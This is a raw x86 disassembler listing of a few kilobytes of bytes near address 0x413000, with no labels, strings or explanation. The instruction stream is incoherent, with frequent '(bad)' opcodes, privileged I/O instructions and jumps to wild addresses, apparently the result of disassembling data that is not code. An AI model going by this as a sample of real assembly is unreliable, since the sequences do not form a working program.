  412fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fb5:	jne    0x412fa7
  412fb7:	leave  
  412fb8:	sub    al,0x2e
  412fba:	and    al,0x9b
  412fbc:	xlat   BYTE PTR ds:[ebx]
  412fbd:	jl     0x41303e
  412fbf:	sub    DWORD PTR [ebp-0x2b768386],eax
  412fc5:	scas   al,BYTE PTR es:[edi]
  412fc6:	cwde   
  412fc7:	push   esp
  412fc8:	and    eax,0x3ee0e140
  412fcd:	pop    ebx
  412fce:	sahf   
  412fcf:	and    BYTE PTR [ebx],bl
  412fd1:	sub    DWORD PTR ds:0x812f4784,esp
  412fd7:	or     ebx,DWORD PTR [ecx-0x71]
  412fda:	test   BYTE PTR [eax+ecx*2-0x3],0xb1
  412fdf:	pushf  
  412fe0:	or     edi,DWORD PTR [edx+ecx*1]
  412fe3:	jmp    0x1eac4895
  412fe8:	mov    ebx,0x102cb8d1
  412fed:	aas    
  412fee:	xchg   BYTE PTR [ecx],dl
  412ff0:	jae    0x412fe7
  412ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff3:	cmp    dh,BYTE PTR [edi+0x28]
  412ff6:	stos   DWORD PTR es:[edi],eax
  412ff7:	popa   
  412ff8:	les    eax,FWORD PTR [esi]
  412ffa:	dec    esi
  412ffb:	mov    WORD PTR [eax-0x30bb2f14],ss
  413001:	cmp    esp,DWORD PTR [edi]
  413003:	xor    eax,0xf95d89e5
  413008:	pop    edx
  413009:	mov    dl,0xae
  41300b:	mov    ds:0xb99c7ab5,al
  413011:	xor    BYTE PTR [esi+0x71],bl
  413014:	xor    eax,0x743320fb
  413019:	push   esi
  41301a:	je     0x41305c
  41301c:	stos   DWORD PTR es:[edi],eax
  41301d:	dec    ebp
  41301e:	js     0x412fe5
  413020:	xor    cl,BYTE PTR [esi]
  413022:	ret    0xde55
  413025:	pop    eax
  413026:	push   ss
  413027:	sub    al,0xd7
  413029:	sbb    bl,dl
  41302b:	sbb    eax,0x4da3f4f7
  413030:	int    0x68
  413032:	inc    ebp
  413033:	jae    0xb8087b50
  413039:	adc    BYTE PTR [ecx],0xbb
  41303c:	rcl    ecx,0x2a
  41303f:	in     al,dx
  413040:	imul   ecx,ecx,0xfd4661a2
  413046:	das    
  413047:	imul   ebx,DWORD PTR [ebp-0x38],0x8d806228
  41304e:	mov    dl,0x6b
  413050:	cld    
  413051:	mov    ah,0xd7
  413053:	adc    eax,0x59ac4e63
  413058:	sbb    DWORD PTR [esi-0x6b4846cc],eax
  41305e:	(bad)  
  41305f:	cmp    DWORD PTR [ebp+0x37f4f55],edi
  413065:	dec    ebx
  413066:	fadd   QWORD PTR [esi+0x18]
  413069:	or     al,0xd6
  41306b:	ss cmc 
  41306d:	sbb    BYTE PTR [edx+0x44],cl
  413070:	jns    0x413015
  413072:	sbb    bh,BYTE PTR [eax-0x4dcf3f16]
  413078:	adc    cl,BYTE PTR [ecx]
  41307a:	jno    0x413045
  41307c:	std    
  41307d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41307e:	jp     0x41308c
  413080:	sub    BYTE PTR [esi+ebp*2-0x16],dh
  413084:	jb     0x4130d3
  413086:	xchg   edx,eax
  413087:	mov    ebx,DWORD PTR [ecx-0x3e0ddfd6]
  41308d:	out    0x5c,al
  41308f:	inc    eax
  413090:	inc    ebp
  413091:	test   al,0x95
  413093:	imul   ecx,DWORD PTR [edi],0x69
  413096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413097:	lods   al,BYTE PTR ds:[esi]
  413098:	cmp    eax,0xe498df35
  41309d:	mov    edi,0xecd17d87
  4130a2:	mov    bl,0xd
  4130a4:	loope  0x4130a6
  4130a6:	(bad)  
  4130a8:	xchg   DWORD PTR [eax],ebx
  4130aa:	xor    esp,ecx
  4130ac:	int    0xed
  4130ae:	(bad)  
  4130af:	int    0x1a
  4130b1:	(bad)  
  4130b2:	push   ds
  4130b3:	lock inc esp
  4130b6:	mov    dh,0xe3
  4130b8:	ins    BYTE PTR es:[edi],dx
  4130b9:	sbb    eax,0x15675909
  4130be:	xor    eax,0x5150846b
  4130c3:	fdiv   QWORD PTR [edi+0x5f]
  4130c6:	inc    ebx
  4130c7:	add    eax,0xdd9625d2
  4130cc:	sbb    ch,bh
  4130ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130cf:	cdq    
  4130d0:	fcom   DWORD PTR ds:[edx]
  4130d3:	data16 jle 0x413093
  4130d6:	and    BYTE PTR [esi-0x31254e47],cl
  4130dc:	xchg   BYTE PTR [edx+0x69],bl
  4130df:	imul   ecx,ecx,0x929f42e3
  4130e5:	pop    esp
  4130e6:	aaa    
  4130e7:	add    esp,ebp
  4130e9:	or     al,0xcd
  4130eb:	push   ecx
  4130ec:	xor    edx,ebp
  4130ee:	in     al,dx
  4130ef:	sbb    ebx,ecx
  4130f1:	and    bl,BYTE PTR [edi]
  4130f3:	adc    DWORD PTR [esi],edi
  4130f5:	sub    dh,BYTE PTR [edx-0x3ae7695e]
  4130fb:	pop    edi
  4130fc:	inc    edi
  4130fd:	bound  edx,QWORD PTR [ebp+esi*4+0x33]
  413101:	xchg   ebp,eax
  413102:	dec    edx
  413103:	add    eax,0xb65d52b3
  413108:	loopne 0x4130ef
  41310a:	and    edx,DWORD PTR [edx-0x2e]
  41310d:	(bad)  
  41310e:	xor    al,0x56
  413110:	arpl   WORD PTR [esi],ax
  413112:	xchg   edi,eax
  413113:	pushf  
  413114:	jbe    0x4130b7
  413116:	push   cs
  413117:	adc    BYTE PTR [edi+edx*1+0x6c],cl
  41311b:	(bad)
  41311f:	adc    ch,BYTE PTR [ebx+0x48bd5940]
  413125:	or     DWORD PTR ds:0xb34b6790,ecx
  41312b:	test   BYTE PTR [edi+0x15b96794],bl
  413131:	adc    BYTE PTR [ebp+ebx*4+0x46f7bc49],dl
  413138:	(bad)  
  41313a:	stc    
  41313b:	cs mov ds,WORD PTR cs:[edx-0x6]
  413140:	pusha  
  413141:	jnp    0x41318f
  413143:	inc    esp
  413144:	cmp    DWORD PTR [ebx+ebp*2],ebx
  413147:	adc    eax,0xc2e8d306
  41314c:	jmp    0xc5e3:0x1ba613d1
  413153:	add    BYTE PTR ds:0x1acc0169,ah
  413159:	cwde   
  41315a:	shl    ebp,1
  41315c:	jmp    ebp
  41315e:	(bad)  
  41315f:	pop    eax
  413160:	mov    es,edi
  413162:	jp     0x41316e
  413164:	call   0xf3c5b2c7
  413169:	push   ebx
  41316a:	xchg   esp,eax
  41316b:	call   0x66e22ca4
  413170:	nop
  413171:	jne    0x413117
  413173:	mov    ebp,0xadc60d12
  413178:	nop
  413179:	pop    ebx
  41317a:	xor    al,0xcc
  41317c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41317d:	or     esi,eax
  41317f:	dec    eax
  413180:	jnp    0x413183
  413182:	mov    dl,0x8e
  413184:	cld    
  413185:	dec    esp
  413187:	xor    DWORD PTR [eax],edi
  413189:	adc    DWORD PTR [edx+esi*4+0x61],esp
  41318d:	inc    eax
  41318e:	mov    gs,WORD PTR [ecx]
  413190:	pop    esp
  413191:	es ds inc eax
  413194:	push   ds
  413195:	sub    DWORD PTR [ebx],esi
  413197:	addr16 mov bl,0x44
  41319a:	or     edi,DWORD PTR [ebx-0x5ccd4f51]
  4131a0:	stos   DWORD PTR es:[edi],eax
  4131a1:	jg     0x41319d
  4131a3:	mov    ebp,ebp
  4131a5:	out    0x94,al
  4131a7:	bound  eax,QWORD PTR [edx-0x3a2b049]
  4131ad:	xor    bl,BYTE PTR [edx+0x54f3fbba]
  4131b3:	popa   
  4131b4:	mov    DWORD PTR [edi],ebx
  4131b6:	jg     0x413219
  4131b8:	aas    
  4131b9:	aam    0xc8
  4131bb:	test   al,0xff
  4131bd:	xor    al,0x5c
  4131bf:	fldenv [ebx+ecx*8]
  4131c2:	sbb    al,0xba
  4131c4:	jnp    0x4131ec
  4131c6:	jo     0x4131c4
  4131c8:	mov    ebx,0x60d2ee34
  4131cd:	push   eax
  4131ce:	jmp    0x30c888d
  4131d3:	sbb    BYTE PTR [edi],dh
  4131d5:	in     eax,dx
  4131d6:	(bad)  
  4131d7:	cmp    eax,0xb5565aef
  4131dc:	mov    ebx,0xd8d42c3c
  4131e1:	fsubr  QWORD PTR [edi-0x60934edf]
  4131e7:	cmp    DWORD PTR ds:0x66f8ea3a,edi
  4131ed:	hlt    
  4131ee:	adc    al,0xa9
  4131f0:	sub    al,0x85
  4131f2:	dec    edx
  4131f3:	jl     0x4131d8
  4131f5:	sub    BYTE PTR ds:0x2e79242b,ah
  4131fb:	adc    BYTE PTR [ebp-0x52a0f036],bh
  413201:	pop    edx
  413202:	addr16 dec edi
  413204:	pop    ds
  413205:	push   0xa3f5fb77
  41320a:	xor    al,0xf7
  41320c:	bound  esi,QWORD PTR [edx-0x685bf8a3]
  413212:	ret    0xf7be
  413215:	sbb    al,BYTE PTR [esi]
  413217:	cs addr16 push ebp
  41321a:	and    BYTE PTR [ecx+0x2b],0x71
  41321e:	sbb    BYTE PTR [eax-0x57],0xfa
  413222:	sbb    cl,BYTE PTR [edi+esi*1]
  413225:	daa    
  413226:	adc    eax,DWORD PTR [ecx+0x2c]
  413229:	ins    DWORD PTR es:[edi],dx
  41322a:	push   edi
  41322b:	cdq    
  41322c:	dec    eax
  41322d:	mov    cl,0x6d
  41322f:	lods   eax,DWORD PTR ds:[esi]
  413230:	cmp    edx,DWORD PTR [edi+0x4c]
  413233:	jle    0x413268
  413235:	push   edx
  413236:	nop
  413237:	sbb    bl,ah
  413239:	fisttp QWORD PTR [esp+ebx*4-0x41]
  41323d:	jmp    0xb909a6c8
  413242:	inc    eax
  413243:	cmp    al,0xc9
  413245:	sahf   
  413246:	mov    bl,BYTE PTR [esi-0x1cc20128]
  41324c:	jnp    0x41325f
  41324e:	sub    bl,BYTE PTR [ecx]
  413250:	stc    
  413251:	rcl    DWORD PTR [esi-0x3e],1
  413254:	inc    ebx
  413255:	es loope 0x413228
  413258:	mov    bh,0xe6
  41325a:	aam    0xd4
  41325c:	addr16 mov ds:0xc9fe,al
  413260:	xor    eax,ebp
  413262:	(bad)  
  413264:	test   BYTE PTR [edx-0x5cd5d81c],bh
  41326a:	jno    0x413228
  41326c:	jbe    0x413290
  41326e:	cmp    ah,BYTE PTR [ebp+0x5f]
  413271:	inc    eax
  413272:	add    BYTE PTR [esi-0x25],al
  413275:	jb     0x41327d
  413277:	pusha  
  413278:	xchg   esi,eax
  413279:	sbb    al,dl
  41327b:	adc    al,0x18
  41327d:	pop    edx
  41327e:	xor    al,0x3a
  413280:	lea    edi,ss:[eax+ecx*2+0x3b66177c]
  413288:	push   esi
  413289:	pushf  
  41328a:	sub    eax,0x4dd86e0
  41328f:	in     eax,dx
  413290:	xor    dl,ah
  413292:	jns    0x413215
  413294:	in     eax,0xb7
  413296:	(bad)  
  413297:	sub    al,bh
  413299:	arpl   WORD PTR [ebp+0x12211e0a],ax
  41329f:	cmp    ah,BYTE PTR [ebx]
  4132a1:	popf   
  4132a2:	hlt    
  4132a3:	enter  0xaad5,0xed
  4132a7:	pop    ecx
  4132a8:	xor    eax,DWORD PTR [eax-0x2b]
  4132ab:	mov    ah,0x68
  4132ad:	fcom   QWORD PTR [eax]
  4132af:	push   cs
  4132b0:	daa    
  4132b1:	retf   0x4efe
  4132b4:	cld    
  4132b5:	sar    DWORD PTR [ebp-0x51],cl
  4132b8:	adc    bl,cl
  4132ba:	xor    BYTE PTR [esp+esi*1+0x7f7a001a],bh
  4132c1:	mov    eax,ds:0xf0bea7a7
  4132c6:	adc    edi,DWORD PTR ds:0x2032
  4132cb:	lods   al,BYTE PTR ds:[esi]
  4132cc:	mov    bl,0x51
  4132ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132cf:	fimul  WORD PTR [edx]
  4132d1:	adc    DWORD PTR [edi+0x6bb48f9c],edi
  4132d7:	ins    BYTE PTR es:[edi],dx
  4132d8:	test   eax,0x2c8ad9ab
  4132dd:	dec    edi
  4132de:	push   eax
  4132df:	sahf   
  4132e0:	pop    esp
  4132e1:	push   edi
  4132e2:	add    esi,ecx
  4132e4:	push   ss
  4132e5:	add    BYTE PTR [edi],0x7a
  4132e8:	ret    0xd0e5
  4132eb:	xchg   ebp,eax
  4132ec:	sahf   
  4132ed:	mov    BYTE PTR [ebp-0x164e8a1e],bh
  4132f3:	adc    esi,DWORD PTR [ebx]
  4132f5:	call   FWORD PTR [ecx+0x59]
  4132f8:	adc    BYTE PTR [ebp+0x6d],0x92
  4132fc:	sahf   
  4132fd:	pop    es
  4132fe:	push   esi
  4132ff:	ins    BYTE PTR es:[edi],dx
  413300:	mov    ah,0x96
  413302:	push   ss
  413303:	js     0x413319
  413305:	or     BYTE PTR [ebx-0x7c],cl
  413308:	mov    esp,0x270c9e5b
  41330d:	xor    BYTE PTR [edi+0x3b],ch
  413310:	call   0x1d09:0x7022c0da
  413317:	dec    edi
  413318:	pop    eax
  413319:	repnz mov dl,0xe1
  41331c:	in     al,dx
  41331d:	out    dx,al
  41331e:	add    al,0xbc
  413320:	mov    edx,ecx
  413322:	stos   DWORD PTR es:[edi],eax
  413323:	mov    eax,ds:0x60606542
  413328:	xchg   ecx,eax
  413329:	xor    esp,esp
  41332b:	inc    eax
  41332c:	(bad)  
  41332d:	sub    eax,0xdec24d3c
  413332:	pop    edi
  413333:	jne    0x4132f3
  413335:	dec    ecx
  413336:	cs leave 
  413338:	jnp    0x4132c8
  41333a:	xchg   edi,eax
  41333b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333c:	call   0xfd44:0x8fdd0ad7
  413343:	je     0x413387
  413345:	xor    ebp,DWORD PTR [esi]
  413347:	xor    al,0x5e
  413349:	push   esi
  41334a:	dec    ebp
  41334b:	fimul  WORD PTR [ebx+0x70]
  41334e:	std    
  41334f:	jg     0x413345
  413351:	das    
  413352:	cdq    
  413353:	sbb    BYTE PTR [ecx+0x1b],ch
  413356:	xchg   esi,eax
  413357:	out    dx,al
  413358:	std    
  413359:	xchg   edi,eax
  41335a:	lahf   
  41335b:	jb     0x4133bc
  41335d:	pushf  
  41335e:	and    eax,0x4049c75a
  413363:	rdmsr  
  413365:	jae    0x4132f4
  413367:	stc    
  413368:	xchg   ecx,eax
  413369:	ins    DWORD PTR es:[edi],dx
  41336a:	adc    DWORD PTR [eax+edi*2],edx
  41336d:	jmp    ax
  413370:	sbb    eax,0x84561848
  413375:	test   BYTE PTR [edx],bh
  413377:	push   ds
  413378:	pop    ebp
  413379:	or     DWORD PTR [ebx-0x1de924d3],ecx
  41337f:	lock das 
  413381:	fnsave [ecx]
  413383:	in     al,0x87
  413385:	loope  0x4133be
  413387:	inc    ecx
  413388:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41338a:	jno    0x4133c9
  41338c:	shr    edi,cl
  41338e:	mov    bl,0xf9
  413390:	(bad)  
  413391:	lock xchg esp,eax
  413393:	fcomp  st(7)
  413395:	xor    bh,ch
  413397:	lods   al,BYTE PTR ds:[esi]
  413398:	stos   DWORD PTR es:[edi],eax
  413399:	push   edx
  41339a:	cs test dl,dl
  41339d:	repz sar BYTE PTR [ebx-0x3b],1
  4133a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133a2:	dec    edx
  4133a3:	push   esp
  4133a4:	fs push esp
  4133a6:	loop   0x41335e
  4133a8:	int    0xab
  4133aa:	mov    bh,0x19
  4133ac:	fcmovnb st,st(2)
  4133ae:	push   ebx
  4133af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b0:	aam    0x15
  4133b2:	std    
  4133b3:	rol    BYTE PTR [edx+ebp*4+0x52],1
  4133b7:	xor    al,0x4e
  4133b9:	loope  0x413363
  4133bb:	lock cmp eax,0xe996be78
  4133c1:	push   eax
  4133c2:	mov    eax,ds:0xbb4e2942
  4133c7:	call   0x83420f55
  4133cc:	dec    esi
  4133cd:	test   eax,0x5f081e7b
  4133d2:	and    al,0x5b
  4133d4:	and    ah,al
  4133d6:	repz call 0xe1bf:0x37126254
  4133de:	sub    BYTE PTR ds:0x628d2c47,bh
  4133e4:	or     dh,BYTE PTR [ecx+0x5aee2492]
  4133ea:	sbb    ah,0xac
  4133ed:	pop    ebp
  4133ee:	test   eax,0x70ccc2a3
  4133f3:	adc    eax,0x60b1af55
  4133f8:	xor    bl,ah
  4133fa:	sub    eax,0xd1b6a33c
  4133ff:	bound  esi,QWORD PTR [ecx+0x44]
  413402:	ja     0x413466
  413404:	lahf   
  413405:	pusha  
  413406:	xchg   ecx,eax
  413407:	test   BYTE PTR [ebx-0x3c01d8a7],bh
  41340d:	test   eax,0xb098e0d0
  413412:	lods   al,BYTE PTR ds:[esi]
  413413:	push   ebx
  413414:	int3   
  413415:	mov    ds:0x4e79bd53,al
  41341a:	mov    al,0x83
  41341c:	out    0x41,al
  41341e:	lods   al,BYTE PTR ds:[esi]
  41341f:	in     eax,0xcf
  413421:	rcl    DWORD PTR [eax-0x4],0x92
  413425:	pop    ebp
  413426:	cs inc ecx
  413428:	mov    edi,0x14a4a63d
  41342d:	push   ebx
  41342e:	mov    DWORD PTR [esi],edx
  413430:	cli    
  413431:	inc    eax
  413432:	push   ecx
  413433:	adc    BYTE PTR [esi-0x1732e7de],dh
  413439:	dec    esp
  41343a:	mov    WORD PTR [eax],gs
  41343c:	add    eax,0x373121e5
  413441:	enter  0x8428,0xa3
  413445:	mov    ebx,0xee52b508
  41344a:	mov    dh,0x13
  41344c:	bound  ecx,QWORD PTR [eax]
  41344e:	imul   eax,edx,0x10
  413451:	pop    ecx
  413452:	pop    ebx
  413453:	adc    eax,0x77f4b5e1
  413458:	xor    al,0x55
  41345a:	push   0xffffffe3
  41345c:	rol    DWORD PTR [edi+0x25c0a4b5],cl
  413462:	(bad)  
  413463:	mov    cl,0x84
  413465:	ret    0xd686
  413468:	cmp    al,0xd3
  41346a:	dec    ecx
  41346b:	out    dx,eax
  41346c:	adc    ch,dl
  41346e:	add    eax,0x8c6b11ed
  413473:	aam    0x3c
  413475:	jo     0x413482
  413477:	loope  0x4134b2
  413479:	xor    al,0x29
  41347b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41347c:	lock iret 
  41347e:	hlt    
  41347f:	sub    al,0x27
  413481:	ins    BYTE PTR es:[edi],dx
  413482:	sub    DWORD PTR gs:[esi-0x1d],esi
  413486:	push   ebx
  413487:	dec    esi
  413488:	fisub  WORD PTR [ebp+0x71]
  41348b:	cs gs ds inc edi
  41348f:	xor    DWORD PTR [ebx],ecx
  413491:	cwde   
  413492:	in     eax,0x7d
  413494:	loope  0x41348f
  413496:	shl    DWORD PTR [ebx-0x4e73f42a],1
  41349c:	fisttp DWORD PTR [ebx+0x25573a5b]
  4134a2:	shl    ebx,cl
  4134a4:	push   ds
  4134a5:	das    
  4134a6:	ror    DWORD PTR [ecx+edx*8],1
  4134a9:	ins    BYTE PTR es:[edi],dx
  4134aa:	cmp    DWORD PTR [esi+0x1e33da33],ebx
  4134b0:	fstp   QWORD PTR ds:0x64a85936
  4134b6:	cmp    eax,0xa9f52a47
  4134bb:	mov    dl,0x2c
  4134bd:	in     al,dx
  4134be:	adc    ecx,DWORD PTR [ecx]
  4134c0:	sub    eax,DWORD PTR [eax-0x743af611]
  4134c6:	mov    esp,0x2c2147c8
  4134cb:	mov    esi,0xec58a137
  4134d0:	jmp    0xc654:0x8388d2ab
  4134d7:	cmp    DWORD PTR es:[ecx-0x79],eax
  4134db:	adc    BYTE PTR [esi-0x2e4e2c50],ch
  4134e1:	leave  
  4134e2:	jne    0x41351e
  4134e4:	or     ch,bl
  4134e6:	push   ds
  4134e7:	dec    ecx
  4134e8:	enter  0x45f0,0x9b
  4134ec:	cmp    al,0xc2
  4134ee:	ja     0x41350e
  4134f0:	mov    eax,ds:0x4581a1b4
  4134f5:	pop    ds
  4134f6:	js     0x41349e
  4134f8:	mul    BYTE PTR [edi+0xde9bb8d]
  4134fe:	mov    bh,0x3f
  413500:	xchg   edx,eax
  413501:	jp     0x413492
  413503:	dec    edi
  413504:	mov    ebx,0x55a16d6b
  413509:	leave  
  41350a:	stos   BYTE PTR es:[edi],al
  41350b:	rcr    DWORD PTR [ebp-0x2fbd3fb2],cl
  413511:	xchg   edi,eax
  413512:	push   ds
  413513:	pop    edx
  413514:	xchg   DWORD PTR [ebx],ecx
  413516:	dec    ebx
  413517:	xchg   ecx,eax
  413518:	js     0x413557
  41351a:	inc    esi
  41351b:	popf   
  41351c:	add    DWORD PTR [edi-0x1a0fba4a],esi
  413522:	repnz xchg esp,eax
  413524:	push   0x47
  413526:	sti    
  413527:	mov    al,ds:0x7de9d53c
  41352c:	(bad)  
  41352d:	jne    0x41352f
  41352f:	scas   eax,DWORD PTR es:[edi]
  413530:	ds call 0xde32:0x94b26157
  413538:	or     al,0xd0
  41353a:	aaa    
  41353b:	scas   eax,DWORD PTR es:[edi]
  41353c:	sub    DWORD PTR [ebx],esp
  41353e:	loop   0x41359b
  413540:	push   eax
  413541:	iret   
  413542:	dec    edi
  413543:	adc    bh,BYTE PTR cs:[ecx]
  413546:	lea    esi,[ebp-0x15]
  413549:	inc    edi
  41354a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41354b:	sub    ebx,DWORD PTR [ecx]
  41354d:	xor    al,0x9
  41354f:	popf   
  413550:	loop   0x413596
  413552:	mov    bh,0x7d
  413554:	mov    DWORD PTR [ecx+eiz*1],edi
  413557:	(bad)  
  413558:	jle    0x4134f2
  41355a:	and    esi,DWORD PTR [ecx]
  41355c:	ins    BYTE PTR es:[edi],dx
  41355d:	int3   
  41355e:	xor    BYTE PTR [ebp+0x7dea1d77],bh
  413564:	inc    esi
  413565:	push   esp
  413566:	jp     0x4135ab
  413568:	jmp    0x41359e
  41356a:	adc    BYTE PTR [esi],ch
  41356c:	jg     0x413554
  41356e:	or     ch,BYTE PTR [edx]
  413570:	sahf   
  413571:	jmp    0x4135aa
  413573:	xor    eax,0x823ef444
  413578:	xchg   esp,eax
  413579:	shr    BYTE PTR [edi+0x126013b2],cl
  41357f:	sbb    esp,DWORD PTR es:[ebp+0x40]
  413583:	adc    dl,BYTE PTR [edx+0x624a4d8e]
  413589:	adc    edx,DWORD PTR [ecx-0xc190102]
  41358f:	in     al,dx
  413590:	jbe    0x4135a6
  413592:	cli    
  413593:	mov    al,ds:0x97529039
  413598:	xchg   ebx,eax
  413599:	cmp    BYTE PTR [edx],ch
  41359b:	mov    esi,0xf585ca
  4135a0:	stc    
  4135a1:	inc    edx
  4135a2:	test   eax,0xaf1bad45
  4135a7:	xchg   esp,eax
  4135a8:	dec    esp
  4135a9:	in     eax,dx
  4135aa:	and    dh,BYTE PTR [esi+ebx*1+0x23]
  4135ae:	push   0xffffff94
  4135b0:	push   eax
  4135b1:	aad    0xae
  4135b3:	scas   eax,DWORD PTR es:[edi]
  4135b4:	mov    edi,?
  4135b6:	repz jno 0x4135cd
  4135b9:	(bad)  [edx]
  4135bb:	popf   
  4135bc:	cmp    eax,0x9ff2ad0c
  4135c1:	and    cl,ch
  4135c3:	scas   al,BYTE PTR es:[edi]
  4135c4:	inc    eax
  4135c5:	jmp    0x4135df
  4135c7:	mov    ds:0x8b575b69,eax
  4135cc:	xor    DWORD PTR [edi-0x2b],eax
  4135cf:	sbb    ecx,ebx
  4135d1:	add    ecx,DWORD PTR [edi+edi*4+0x149ba8fb]
  4135d8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135da:	xchg   edi,eax
  4135db:	mov    ds:0x363ef115,eax
  4135e0:	mov    ah,ah
  4135e2:	sbb    bl,BYTE PTR [edx-0x6e26c66d]
  4135e8:	in     eax,0x42
  4135ea:	fsub   QWORD PTR [ebx]
  4135ec:	add    al,0x3a
  4135ee:	popf   
  4135ef:	pop    edx
  4135f0:	push   cs
  4135f1:	mov    ebp,0x84be770b
  4135f6:	ret    
  4135f7:	and    eax,0xf2eb0ddc
  4135fc:	jo     0x413664
  4135fe:	mov    ss,WORD PTR [ecx-0x12aaa49c]
  413604:	sti    
  413605:	mov    edi,0x2acd4037
  41360a:	sti    
  41360b:	das    
  41360c:	mov    ah,0xcb
  41360e:	xchg   edi,eax
  41360f:	sub    DWORD PTR [eax+0x42eaf7a],0x446afc9e
  413619:	pop    es
  41361a:	clc    
  41361b:	cmp    al,0x8f
  41361d:	sbb    al,0xfa
  41361f:	pop    ds
  413620:	dec    edx
  413621:	jp     0x4135e3
  413623:	lods   al,BYTE PTR ds:[esi]
  413624:	retf   
  413625:	in     eax,dx
  413626:	mov    cl,0x70
  413628:	out    0x86,eax
  41362a:	dec    edx
  41362b:	sub    BYTE PTR [esi-0x7abea70e],ah
  413631:	jb     0x4136a5
  413633:	mov    bh,0x7
  413635:	or     ch,BYTE PTR [ebx+edi*1-0x2af94960]
  41363c:	add    ebp,DWORD PTR [ebp+0x79]
  41363f:	fsubr  DWORD PTR [edi-0xd]
  413642:	mov    ebp,0xbc95d6f
  413647:	push   ebp
  413648:	(bad)  
  413649:	(bad)  [esp+ecx*1]
  41364c:	cmp    BYTE PTR [ebx+eiz*4+0xc],ah
  413650:	mov    ds:0x4f0e518d,eax
  413655:	xchg   edx,eax
  413656:	add    ebx,ebp
  413658:	mov    bh,0x9e
  41365a:	ins    BYTE PTR es:[edi],dx
  41365b:	cmp    eax,0xd91ef87d
  413660:	xchg   ebx,eax
  413661:	dec    ebx
  413662:	jo     0x4136cb
  413664:	xchg   ecx,eax
  413665:	cdq    
  413666:	mov    dl,0x90
  413668:	xchg   BYTE PTR [ecx-0x69a19424],cl
  41366e:	mov    ecx,0x694c0ae8
  413673:	push   ds
  413674:	pop    ss
  413675:	loope  0x4136d0
  413677:	xchg   edx,eax
  413678:	or     al,0xdb
  41367a:	jmp    FWORD PTR [ebp-0x45e5471e]
  413680:	sar    BYTE PTR [esi+edi*8],1
  413683:	push   ss
  413684:	mov    DWORD PTR [esi+0x12],edi
  413687:	(bad)
  41368b:	out    dx,al
  41368c:	in     al,0x99
  41368e:	jg     0x413615
  413690:	push   ebp
  413691:	lea    esi,[ebp+0x553c09ca]
  413697:	iret   
  413698:	jecxz  0x413663
  41369a:	call   0x40104c22
  41369f:	outs   dx,BYTE PTR ds:[esi]
  4136a0:	adc    ch,bl
  4136a2:	mov    ebp,eax
  4136a4:	ins    BYTE PTR es:[edi],dx
  4136a5:	jo     0x41369c
  4136a7:	adc    BYTE PTR [ecx],bl
  4136a9:	dec    esi
  4136aa:	or     bh,ch
  4136ac:	mov    dl,0x53
  4136ae:	(bad)  
  4136af:	fwait
  4136b0:	les    ecx,FWORD PTR [esi+ebp*2+0x6d320ad3]
  4136b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b8:	aam    0x59
  4136ba:	cmp    BYTE PTR [ecx-0x38],cl
  4136bd:	jge    0x4136fd
  4136bf:	imul   ecx,DWORD PTR [ebp+0x6ef2f6f6],0x0
  4136c6:	into   
  4136c7:	scas   eax,DWORD PTR es:[edi]
  4136c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136c9:	stos   DWORD PTR es:[edi],eax
  4136ca:	mov    bh,BYTE PTR [ecx+0x4998e842]
  4136d0:	test   al,0x4a
  4136d2:	shl    DWORD PTR [esi],cl
  4136d4:	lock loop 0x4136b1
  4136d7:	hlt    
  4136d8:	lahf   
  4136d9:	pop    es
  4136da:	mov    dh,BYTE PTR [esi+ebp*4+0x79]
  4136de:	push   ebp
  4136df:	or     ebp,esi
  4136e1:	sub    DWORD PTR ds:0x42f36dc9,esi
  4136e7:	out    dx,al
  4136e8:	inc    ecx
  4136e9:	popa   
  4136ea:	sbb    ebp,DWORD PTR [eax-0x2d]
  4136ed:	mov    cl,BYTE PTR [edx]
  4136ef:	pop    es
  4136f0:	xor    esi,DWORD PTR [ecx-0x30a9c8df]
  4136f6:	mov    dl,0x8d
  4136f8:	push   ebp
  4136f9:	lods   eax,DWORD PTR ds:[esi]
  4136fa:	mov    dl,0xcc
  4136fc:	addr16 (bad) 
  4136fe:	jne    0x4136eb
  413700:	jecxz  0x413722
  413702:	sbb    eax,0xba90e981
  413707:	adc    eax,0xb4103b47
  41370c:	jmp    0x82bf39d6
  413711:	jb     0x41374f
  413713:	repnz sbb al,BYTE PTR [edx]
  413716:	mov    eax,ds:0x451784b
  41371b:	call   0x1269383
  413720:	les    eax,FWORD PTR [ebp+0x6fc42957]
  413726:	mov    ecx,0x422625a2
  41372b:	jl     0x41371e
  41372d:	jne    0x4136ca
  41372f:	loope  0x413715
  413731:	mul    ecx
  413733:	push   edx
  413734:	xor    al,0x15
  413736:	in     eax,dx
  413737:	push   esi
  413738:	pop    esp
  413739:	enter  0x95e4,0x5a
  41373d:	icebp  
  41373e:	stc    
  41373f:	scas   eax,DWORD PTR es:[edi]
  413740:	popa   
  413741:	loop   0x41374e
  413743:	sbb    dh,dl
  413745:	es jb  0x4136d3
  413748:	sbb    eax,0x24c39a9e
  41374d:	mov    ds:0xabf454bc,eax
  413752:	mov    bl,0xd3
  413754:	imul   ebp,DWORD PTR ds:[esi-0x6d],0xffffffe6
  413759:	aas    
  41375a:	pusha  
  41375b:	retf   
  41375c:	popf   
  41375d:	shl    BYTE PTR [eax+ecx*4+0x3a654859],0x75
  413765:	mov    ?,WORD PTR [ebp+0x73]
  413768:	jb     0x413709
  41376a:	fiadd  WORD PTR [edx+ebx*1+0x6f]
  41376e:	loopne 0x413727
  413770:	mov    esp,0xe4504563
  413775:	mov    al,0x28
  413777:	pop    ebx
  413778:	fcom   st(5)
